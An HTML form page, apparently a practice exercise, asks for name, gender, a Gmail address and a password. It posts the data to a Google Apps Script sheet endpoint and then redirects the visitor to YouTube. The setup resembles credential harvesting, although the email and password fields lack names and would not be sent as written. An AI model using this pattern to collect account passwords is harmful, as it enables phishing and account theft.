<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        table, tr, td{
            border: 1px solid black;
            border-collapse: collapse;
        }
        td{
            padding: 30px;
        }
    </style>
</head>

<body>
    <form action="" name="submit-to-google-sheet">
        <table>
            <tr>
                <td><label for="">Fisrt Name</label></td>
                <td><input type="text" name="first" id=""></td>
            </tr>
            <tr>
                <td><label for="last_name">last_name</label></td>
                <td><input type="text" name="" id=""></td>
            </tr>
            <tr>
                <td><label for="gender">Gender:</label></td>
                <td><input type="radio" name="gender" value="male"> Male</td>
                <td><input type="radio" name="gender" value="female"> Female</td>
                <td><input type="radio" name="gender" value="other"> other</td>
            </tr>
            <tr>
                <td><label for="Gmail">Gmail</label></td>
                <td><input type="email"></td>
            </tr>
            <tr>
                <td><label for="password">password</label></td>
                <td><input type="password" name="" id=""></td>
            </tr>
            <tr>
                <td colspan="2"><input style="width: 100% ;" type="submit" name="" id=""></td>
            </tr>
        </table>
    </form>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbzeBDfIWeZiyTTmBvC7n-4aqTnRGvhV4bhC1DuORNyqC4La7F0cxgUluTPo_Bb8EcLv/exec'
        const form = document.forms['submit-to-google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => window.location.href = "https://www.youtube.com/")
            .catch(error => console.error('Error!', error.message))
        })
      </script>
</body>

</html>
